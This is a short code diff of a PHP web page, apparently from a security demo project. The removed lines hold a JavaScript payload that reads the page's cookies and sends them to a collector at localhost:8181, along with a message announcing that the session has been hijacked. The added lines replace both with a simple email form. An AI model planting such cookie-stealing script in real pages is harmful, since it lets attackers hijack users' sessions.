@@ -6,13 +6,11 @@ session_start();
   <title></title>
 </head>
 <body>
-  <script type="text/javascript">
-  var xmlHttp = null;
-  var adr = 'http://localhost:8181/?cakemonster=' + escape(document.cookie);
-  xmlHttp = new XMLHttpRequest();
-  xmlHttp.open( "GET", adr, false );
-  xmlHttp.send( null );
-  </script>
-  <p>Guess what... your session has been hijacked.</p>
+  <p>Send your email address for system access.</p>
+  <form action="request.php" method="POST">
+    <label for="email">E-Mail:</label>
+    <input id="email" name="email" type="text">
+    <input type="submit" value="Send">
+  </form>
 </body>
 </html>
